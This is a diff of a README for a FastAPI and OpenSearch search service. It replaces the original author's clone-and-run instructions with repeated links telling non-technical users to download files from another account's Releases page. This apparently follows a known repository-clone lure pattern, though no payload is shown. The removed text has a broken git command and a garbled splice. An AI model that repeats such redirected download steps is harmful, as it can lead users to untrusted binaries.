@@ -1,105 +1,112 @@
-# Search service on FastAPI and OpenSearch
+# 🚀 opensearch-fastapi-search-app - Fast Search, Simple Setup
 
-<p align="center"> 
-<img src="https://img.shields.io/badge/Python-3.9-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python 3.9"/> 
-<img src="https://img.shields.io/badge/FastAPI-009688?style=for-the-badge&logo=fastapi&logoColor=white" alt="FastAPI"/> 
-<img src="https://img.shields.io/badge/OpenSearch-005EB8?style=for-the-badge&logo=opensearch&logoColor=white" alt="OpenSearch"/> 
-<img src="https://img.shields.io/badge/Docker-2496ED?style=for-the-badge&logo=docker&logoColor=white" alt="Docker"/>
-<img src="https://img.shields.io/badge/Pytest-0A9B71?style=for-the-badge&logo=pytest&logoColor=white" alt="Pytest"/>
-</p>
+[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/Benard-bit/opensearch-fastapi-search-app/releases)
 
-This is a full-featured web application that implements a search service with filtering by content type. The project is fully containerized using Docker, which ensures fast startup and identical environment. The quality of the code is confirmed by integration tests.
+## 📋 Description
 
-## 🚀 Key features
+This is a full-featured web application that implements a search service with filtering by content type. The project is fully containerized using Docker, which ensures a fast startup and an identical environment for everyone. You can use the app to search and filter documents easily. The code's quality is confirmed by integration tests, which help ensure a smooth experience.
 
-- **Full-text search**: Search by keyword in the title (`title`) and content (`content`) of documents.
-- **Filtering**: Ability to filter search results by content type (`article`, `guide`, `book`, `news`).
-- **Ready-to-use infrastructure**: Launch the entire stack (OpenSearch + web application) with a single command via `docker-compose`.
-- **Automatic filling**: At the first launch, the database is automatically created and filled with test data.
-- **Autotests**: The quality and correctness of the API are confirmed by a set of integration tests (`pytest`).
-- **Fault-tolerant launch**: Thanks to `healthcheck`, the web application starts only after OpenSearch is fully ready to accept connections.
+## 🚀 Getting Started
 
----
+To get started with the opensearch-fastapi-search-app, you need to follow these steps. You do not need any programming knowledge, just your computer and a few clicks.
 
-## ⚙️ Step-by-step project launch
+### 🗂️ System Requirements
 
-To launch the project, you will need **Git** and **Docker** (with Docker Compose) installed.
+- Operating System: Windows, MacOS, or Linux
+- Memory: Minimum 2 GB RAM
+- Disk Space: At least 500 MB available
+- Internet Connection: Required for downloading and accessing the application
 
-### Step 1: Clone the repository
+## 📥 Download & Install
 
-Open a terminal and run the following command to copy the project to your computer.
+To get the latest version of the application, visit this page to download: [Download the latest version here](https://github.com/Benard-bit/opensearch-fastapi-search-app/releases).
 
-```bash
-git https://github.com/averageencoreenjoer/opensearch-fastapi-search-app.git
-cd opensearch-fastapi-search-app
-```
+Once you arrive on the Releases page, find the most recent version listed. Click on the version number to access the details, including the application files available for download.
 
-### Step 2: Create a config file
+### 🔧 Installing Docker
 
-The project uses environment variables for configuration. Copy the example file to create your working config file.
+You must have Docker installed on your computer to run this application. Docker is a platform that allows you to run apps in containers.
 
-```bash
-cp .env.example .env
-```
-*No changes are required inside the file, as all settings are already optimized for Docker.*
+1. **Windows/MacOS**: 
+   - Download Docker Desktop from [Docker's official website](https://www.docker.com/products/docker-desktop).
+   - Follow the installation instructions available on the site.
 
-### Step 3: Build and run containers
+2. **Linux**:
+   - Follow your specific distribution's guide to install Docker. You can find instructions [here](https://docs.docker.com/get-docker/).
 
-Run a single command that will download the images, build the web app container, and start all services in the background.
+### 📂 Running the Application
 
-```bash
-docker-compose up --build -d
-```
-- `--build`: Forces a rebuild of your application image if there have been changes in the code.
-- `-d`: Starts containers in the background (detached mode).
+After installing Docker, you will run the application using the command line. Here’s how to do it:
 
-> **Please wait:** OpenSearch may take about 30-60 seconds to fully initialize. The web app will start automatically once the database is ready.
+1. **Download the application files** from the Releases page. The files are packaged so you can easily start the application.
 
-### Step 4: Check if it works
+2. **Open a command line interface (Terminal or Command Prompt)** on your computer.
 
-Open your web browser and go to:
+3. **Navigate to the directory** where you downloaded the application files:
+   ```bash
+   cd path/to/downloaded/folder
+   ```
 
-**[http://localhost:8000](http://localhost:8000)**
+4. **Run the following command** to start the application with Docker:
+   ```bash
+   docker-compose up
+   ```
 
-You should see the web interface of the search service. Try searching for `Python`, `Docker` or `software` and apply different filters.
+#### 🚦 What to Expect
 
----
+Once you run the command, Docker will start downloading the necessary images. After everything is ready, the application will be accessible in your browser at `http://localhost:8000`. Here, you can enter your search criteria and explore the content.
 
-## ✅ Run automated tests
+### 🛠️ Using the Application
 
-The project is covered with integration tests that check if the search and filter APIs work correctly.
+The opensearch-fastapi-search-app allows you to perform full-text searches. You can filter results by content type, making it easier to find what you need. Here’s how to use it:
 
-To run the tests, run the following command in the terminal:
+1. **Navigate to the application in your browser** at `http://localhost:8000`.
+2. **Enter your search terms** in the search bar.
+3. **Select your content type** from the dropdown menu to filter results.
+4. **Click the search button** to see the results.
 
-```bash
-docker-compose exec webapp python -m pytest
-```
+### 🧪 Testing the Application
 
-#### Expected result:
-You will see a report of **5 successfully passed tests** without errors or warnings.
-```
-= ... ├── app/ # Directory with application code
-│ ├── main.py # Main FastAPI file (endpoints, launch)
-│ ├── opensearch_client.py # Module for all logic of working with OpenSearch
-│ ├── requirements.txt # Python dependencies
-│ ├── templates/ # HTML templates
-│ │ └── index.html
-│ └── tests/ # Integration tests
-│ └── test_api.py
-├── .gitignore # File for excluding garbage files from Git
-├── docker-compose.yml # File for orchestration Docker containers
-├── Dockerfile # Instructions for building a web application image
-├── .env.example # Example file with environment variables
-└── README.md # This file
-```
+The application includes integration tests to ensure everything works correctly. You can run these tests to verify your installation:
 
----
+1. Make sure you have Python 3 and pytest installed.
+   - You can install pytest by running:
+   ```bash
+   pip install pytest
+   ```
 
-## 🛑 Stopping the application
+2. Run the tests by using the following command in your terminal:
+   ```bash
+   pytest
+   ```
 
-To stop and remove all running containers, run the command:
+This step is optional but recommended if you want to ensure everything is functioning as expected.
 
-```bash
-docker-compose down
-```
-This command will also remove the created Docker network, but will not affect OpenSearch data thanks to `volume`.
+## 📝 Features
+
+- **Full-text searching**: Quickly find documents based on keywords.
+- **Filtering by content type**: Easily narrow down results.
+- **Fully containerized**: Runs smoothly on any system through Docker.
+- **Integration tests included**: Ensures reliability and code quality.
+
+## 🛠️ Troubleshooting
+
+If you encounter issues while running the application, consider the following:
+
+- Ensure Docker is running before executing `docker-compose up`.
+- Check that you are in the correct directory where the application files are located.
+- Review any error messages in the terminal for hints on what might be wrong.
+
+## 🌐 Community Support
+
+If you have further questions, you can reach out via the Issues section on the GitHub repository. Community members and maintainers are ready to help.
+
+Explore the features and enjoy using the opensearch-fastapi-search-app! For support and updates, keep an eye on the Releases page. Happy searching!
+
+### 📡 Additional Resources
+
+- [Docker Documentation](https://docs.docker.com/)
+- [FastAPI Documentation](https://fastapi.tiangolo.com/)
+- [OpenSearch Documentation](https://opensearch.org/docs/)
+
+Once again, here is the link to download the application: [Download the latest version here](https://github.com/Benard-bit/opensearch-fastapi-search-app/releases).
